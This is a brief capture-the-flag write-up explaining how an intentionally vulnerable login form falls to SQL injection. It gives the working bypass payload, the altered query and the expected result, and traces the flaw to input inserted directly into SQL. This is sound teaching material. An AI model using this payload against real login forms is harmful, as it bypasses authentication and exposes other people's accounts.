CTF CHALLENGE COMPLETED
-----------------------
Challenge type:
Web vulnerability — SQL Injection (SQLi)

Purpose:
The login form is intentionally vulnerable to SQL injection.

Vulnerable input:
Operator ID / username field

Working SQL injection payload:

   ' OR 1=1 -- 

Password:
Any value can be entered because the SQL comment causes the
password-checking part of the query to be ignored.

Example:

Operator ID:
   ' OR 1=1 -- 

Password:
   anything

Expected result:
ACCESS GRANTED

The application uses fetchone(), so the first matching database
record is returned. At present, this is the pilot account.


How the SQL injection works
---------------------------
The application builds an SQL query by directly inserting the
username and password into the query.

A normal query looks like:

SELECT username, role, clearance
FROM users
WHERE username = 'pilot' AND password = 'flight2026'

The SQL injection changes it to approximately:

SELECT username, role, clearance
FROM users
WHERE username = '' OR 1=1 -- '
AND password = 'anything'

Because 1=1 is always true and the -- comment disables the rest
of the query, the password condition is not checked.


Why this is a vulnerability
---------------------------
The application directly places user-controlled input into an SQL
statement instead of using parameterized queries.

This allows an attacker to modify the intended SQL query and
bypass authentication without knowing a valid password.
